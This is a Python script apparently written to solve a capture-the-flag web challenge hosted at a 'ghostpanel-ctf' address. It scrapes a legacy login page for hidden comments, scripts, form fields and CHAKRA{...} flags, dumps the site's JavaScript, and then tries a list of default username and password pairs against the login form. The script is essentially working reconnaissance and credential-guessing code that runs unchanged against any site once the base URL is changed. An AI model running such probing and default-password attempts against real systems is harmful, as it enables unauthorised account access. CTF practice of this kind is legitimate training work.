import requests, re, base64

BASE = 'https://ghostpanel-ctf.onrender.com'
s = requests.Session()

def clean(html):
    t = re.sub(r'<[^>]+>','',html)
    return re.sub(r'\s+',' ',t).strip()

# 1. /legacy-login
print('=== /legacy-login ===')
r = s.get(BASE + '/legacy-login', timeout=12)
print(f'[{r.status_code}]', clean(r.text)[:400])
flags = re.findall(r'CHAKRA\{[^}]+\}', r.text)
if flags: print('FLAG:', flags)
comments = re.findall(r'<!--(.*?)-->', r.text, re.S)
print('COMMENTS:', [c.strip()[:100] for c in comments])
scripts = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', r.text)
inputs = re.findall(r'<input[^>]+>', r.text)
print('SCRIPTS:', scripts)
print('INPUTS:', inputs)

# 2. Read full app.js
print('\n=== app.js ===')
rj = s.get(BASE + '/static/js/app.js', timeout=12)
print(rj.text[:3000])

# 3. Try /legacy-login with various creds
print('\n=== LOGIN ATTEMPTS ===')
for u,p in [('admin','admin'),('ghost','ghost'),('admin','password'),
            ('admin','ghostpanel'),('administrator','admin123'),('guest','guest')]:
    r2 = s.post(BASE + '/legacy-login', data={'username':u,'password':p}, timeout=8, allow_redirects=True)
    flags2 = re.findall(r'CHAKRA\{[^}]+\}', r2.text)
    if flags2 or r2.url != BASE+'/legacy-login':
        print(f'HIT [{u}/{p}]: {r2.url} {clean(r2.text)[:200]}')
        if flags2: print('FLAG:', flags2)
    else:
        print(f'[{u}/{p}]: fail')
